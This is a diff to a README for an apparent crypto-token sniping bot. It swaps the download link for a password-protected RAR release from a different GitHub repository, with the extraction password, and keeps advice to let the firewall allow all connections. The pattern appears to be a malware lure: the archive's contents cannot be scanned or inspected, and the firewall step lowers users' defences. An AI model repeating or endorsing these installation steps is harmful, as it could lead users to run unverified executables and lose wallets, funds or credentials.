@@ -12,7 +12,7 @@ This bot automatically buys BSC tokens that are trending on Dextools. You can se
 
 ## Installation (public version)
 1. [Install](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472) .NET framework 4.7.2 runtime if it has not been installed.
-2. [Download](https://github.com/timo991/ethrunner/releases/download/Release/Ethrunner.v0.4.1.rar) repository release and extract files with password `o9vbwkhO5X`.
+2. [Download](https://github.com/SniperSwap/dextools-sniper/releases/download/Release/Dextools-v0.2.3.rar) repository release and extract files with password `LrDatfneE`.
 3. Make sure that firewall does not blocks any connections.
 
 ## Usage
